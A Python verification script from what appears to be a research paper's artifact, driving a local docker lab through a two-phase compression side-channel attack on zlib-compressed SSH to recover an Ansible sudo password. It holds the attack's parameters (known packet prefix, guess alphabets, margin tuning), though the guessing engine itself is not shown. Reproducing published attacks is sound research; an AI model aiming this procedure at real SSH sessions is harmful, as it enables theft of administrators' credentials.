"""End-to-end verification for the Ansible scenario (Section 5.3).

Run from the host while the docker-compose stack is up:

    python scripts/verify_ansible.py
    python scripts/verify_ansible.py --commit-margin 16
    python scripts/verify_ansible.py --full-sweep

The commit margin (the paper's mu, Section 4.2) and the pinned alignment
length are host-dependent. This scenario opens a fresh SSH connection per
guess, so it starts from an empty zlib window and is the quietest of the
three; the defaults below are the ones the paper used. If a recovery
returns a wrong password, raise the margin in 8-byte steps. If the pinned
alignment length is wrong for your host, pass --full-sweep to search all
eight. See ARTIFACT-EVALUATION.md, "Tuning the commit margin".

Checks: HTTP control APIs reachable, SSH up with zlib compression,
Ansible LocalForward declared, /set_sudo_secret round-trip works,
/send_secret_ansible reaches the "Sending become_password" marker, and
a two-phase recovery of "hunter2" (CHANNEL_DATA length byte then the
password itself).
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request
from typing import Any, NoReturn

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"

# 8-byte CHANNEL_DATA header prefix for a session-channel packet.
PHASE1_PREFIX = "\x5e\x00\x00\x00\x00\x00\x00\x00"
# Plausible password length bytes (covers up to a 31-char password
# + trailing \n). All below 0x80 so UTF-8 encoding is a no-op.
PHASE1_ALPHABET = "".join(chr(i) for i in range(1, 33))
PHASE2_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
TARGET_SECRET = "hunter2"  # len+1 = 8 -> length byte = \x08

# Paper defaults for this scenario. Overridable on the command line.
DEFAULT_COMMIT_MARGIN = 8
DEFAULT_MAX_ROUNDS = 96
DEFAULT_ALIGNMENT_LENGTH = 1


def _env_int(name: str, fallback: int) -> int:
    raw = os.environ.get(name)
    return int(raw) if raw not in (None, "") else fallback


def _parse_args(argv: list[str] | None) -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        description="Ansible password-recovery verification (Section 5.3).",
    )
    ap.add_argument(
        "--commit-margin", type=int,
        default=_env_int("AE_COMMIT_MARGIN", DEFAULT_COMMIT_MARGIN),
        help=f"Commit margin mu (Section 4.2). Default {DEFAULT_COMMIT_MARGIN}. "
             "Raise in 8-byte steps (16, 24, 32, ...) if a recovery returns a "
             "wrong password.",
    )
    ap.add_argument(
        "--max-rounds", type=int,
        default=_env_int("AE_MAX_ROUNDS", DEFAULT_MAX_ROUNDS),
        help=f"Per-position round cap. Default {DEFAULT_MAX_ROUNDS}.",
    )
    ap.add_argument(
        "--alignment-length", type=int,
        default=_env_int("AE_ALIGNMENT_LENGTH", DEFAULT_ALIGNMENT_LENGTH),
        help=f"Pinned alignment length. Default {DEFAULT_ALIGNMENT_LENGTH}.",
    )
    ap.add_argument(
        "--full-sweep", action="store_true",
        default=os.environ.get("AE_FULL_SWEEP") == "1",
        help="Sweep all eight alignment lengths instead of pinning one. "
             "Slower, but does not assume the paper's winning length.",
    )
    ap.add_argument(
        "--fail-fast", action="store_true",
        default=os.environ.get("AE_FAIL_FAST") == "1",
        help="Send the ground truth as 'expected' so the engine aborts on the "
             "first wrong byte instead of grinding to max_rounds.",
    )
    return ap.parse_args(argv)


def _cfg(args: argparse.Namespace, base: dict[str, Any]) -> dict[str, Any]:
    """Overlay the host-dependent knobs onto a phase's base config."""
    cfg = dict(base)
    cfg["commit_margin"] = args.commit_margin
    cfg["max_rounds"] = args.max_rounds
    if args.full_sweep:
        cfg["alignment_mode"] = "full_sweep"
        cfg["alignment_lengths"] = [0, 1, 2, 3, 4, 5, 6, 7]
    else:
        cfg["alignment_mode"] = "known_length"
        cfg["alignment_lengths"] = [args.alignment_length]
    return cfg


def http(method: str, url: str, body: bytes | None = None,
         content_type: str | None = None, timeout: float = 1800.0) -> dict[str, Any]:
    headers: dict[str, str] = {}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, method=method, data=body, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def wait_for(url: str, label: str, timeout: float = 60.0) -> None:
    deadline = time.time() + timeout
    last_err: Exception | None = None
    while time.time() < deadline:
        try:
            http("GET", url)
            print(f"  [ok] {label} reachable")
            return
        except (urllib.error.URLError, ConnectionResetError, OSError) as exc:
            last_err = exc
            time.sleep(1.0)
    raise SystemExit(f"!! {label} never came up: {last_err}")


def step(title: str) -> None:
    print()
    print("=" * 72)
    print(title)
    print("=" * 72)


def fail(msg: str) -> NoReturn:
    print(f"FAIL: {msg}")
    sys.exit(1)


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)
    step("1. Wait for HTTP control APIs")
    wait_for(f"{ATTACKER_BASE}/status", "attacker")
    wait_for(f"{CLIENT_BASE}/status", "client")

    step("2. Inspect client SSH state")
    cs = http("GET", f"{CLIENT_BASE}/status")
    print(json.dumps(cs, indent=2))

    if not cs.get("ssh_connected"):
        fail("client reports ssh_connected=false")
    send_alg = cs.get("ssh_send_compression")
    if send_alg not in ("zlib", "zlib@openssh.com"):
        fail(f"send compression is {send_alg!r}, expected zlib*")
    print(f"  [ok] compression: {send_alg}")

    pf = cs.get("port_forwards", {})
    ansible_tunnel = pf.get("ansible_tunnel")
    if not ansible_tunnel:
        fail("client does not report an ansible_tunnel port forward")
    print(f"  [ok] ansible LocalForward declared: {ansible_tunnel}")

    step("3. Rotate the sudo secret via /set_sudo_secret")
    resp = http("POST", f"{CLIENT_BASE}/set_sudo_secret",
                body=json.dumps({"value": TARGET_SECRET}).encode("utf-8"),
                content_type="application/json")
    print(f"  [..] set_sudo_secret response: {resp}")
    if not resp.get("ok"):
        fail("set_sudo_secret failed")
    print(f"  [ok] sudo password rotated (length={resp['sudo_secret_length']})")

    step("4. Trigger /send_secret_ansible and capture the packet log")
    http("POST", f"{ATTACKER_BASE}/clear_log")
    t0 = time.time()
    trigger_resp = http("POST", f"{CLIENT_BASE}/send_secret_ansible")
    dt = time.time() - t0
    print(f"  [..] send_secret_ansible took {dt*1000:.0f} ms, response: {trigger_resp}")
    if not trigger_resp.get("ok"):
        fail(f"send_secret_ansible did not report ok: {trigger_resp}")
    if trigger_resp.get("marker") != "password_sent":
        fail(f"send_secret_ansible marker != password_sent: {trigger_resp}")
    print("  [ok] ansible reached the 'Sending become_password' marker")

    time.sleep(0.3)
    log = http("GET", f"{ATTACKER_BASE}/packet_log")
    pw_records = log["records"]
    print(f"  [..] {log['count']} non-ack TCP segments captured around password-send")
    c2s_bytes = sum(
        r["tcp_payload_len"] for r in pw_records
        if r["dport"] == 2222 and r["tcp_payload_len"] > 0
    )
    if c2s_bytes == 0:
        fail("no c->s traffic observed on port 2222 while ansible was running")
    print(f"  [ok] c->s traffic while ansible is running: {c2s_bytes} bytes")

    step("5. Ansible attack: recover hunter2")
    http("POST", f"{CLIENT_BASE}/set_sudo_secret",
         body=json.dumps({"value": TARGET_SECRET}).encode("utf-8"),
         content_type="application/json")
    time.sleep(0.5)

    t_attack = time.time()

    print("  Phase 1: recovering CHANNEL_DATA length byte...")
    phase1_payload: dict[str, Any] = {
        "scenario": "ansible",
        "config": _cfg(args, {
            "known_prefix": PHASE1_PREFIX,
            "alphabet": PHASE1_ALPHABET,
            "max_length": 1,
            "terminator": "\x00",
        }),
    }
    if args.fail_fast:
        phase1_payload["expected"] = chr(len(TARGET_SECRET) + 1)
    phase1_body = json.dumps(phase1_payload).encode("utf-8")
    r1 = http("POST", f"{ATTACKER_BASE}/run_attack",
              body=phase1_body, content_type="application/json")
    if not r1.get("ok"):
        fail(f"Phase 1 attack failed: {r1}")
    length_str = r1["recovered"]
    if len(length_str) != 1:
        fail(f"Phase 1 recovered {length_str!r}, expected a single byte")
    length_byte = ord(length_str[0])
    password_length = length_byte - 1  # subtract the trailing \n
    expected_len_byte = len(TARGET_SECRET) + 1
    print(f"    length byte = 0x{length_byte:02x} "
          f"(password length = {password_length}) "
          f"({r1['elapsed_seconds']:.1f}s)")
    if length_byte != expected_len_byte:
        fail(f"Phase 1 recovered length 0x{length_byte:02x}, "
             f"expected 0x{expected_len_byte:02x}")

    print("  Phase 2: recovering password...")
    phase2_prefix = PHASE1_PREFIX + length_str
    phase2_payload: dict[str, Any] = {
        "scenario": "ansible",
        "config": _cfg(args, {
            "known_prefix": phase2_prefix,
            "alphabet": PHASE2_ALPHABET,
            "max_length": length_byte,
            "terminator": "\n",
        }),
    }
    if args.fail_fast:
        phase2_payload["expected"] = TARGET_SECRET + "\n"
    phase2_body = json.dumps(phase2_payload).encode("utf-8")
    r2 = http("POST", f"{ATTACKER_BASE}/run_attack",
              body=phase2_body, content_type="application/json")
    if not r2.get("ok"):
        fail(f"Phase 2 attack failed: {r2}")
    password = r2["recovered"].rstrip("\n")
    elapsed = time.time() - t_attack
    print(f"    password = {password!r} "
          f"({r2['elapsed_seconds']:.1f}s)")
    print()
    print(f"  Expected:  {TARGET_SECRET}")
    print(f"  Recovered: {password}")
    print(f"  Total:     {elapsed:.1f}s")
    status = "PASS" if password == TARGET_SECRET else "FAIL"
    print(f"  Status:    {status}")
    return 0 if status == "PASS" else 1


if __name__ == "__main__":
    sys.exit(main())
